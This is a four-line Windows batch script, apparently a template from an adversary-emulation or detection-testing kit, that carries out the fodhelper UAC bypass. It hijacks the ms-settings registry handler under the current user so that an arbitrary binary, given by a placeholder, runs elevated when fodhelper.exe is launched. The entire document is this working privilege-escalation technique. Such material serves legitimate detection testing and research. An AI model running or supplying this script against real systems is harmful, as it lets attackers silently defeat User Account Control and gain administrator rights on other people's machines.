@echo off
reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "#{executable_binary}" /f
reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
fodhelper.exe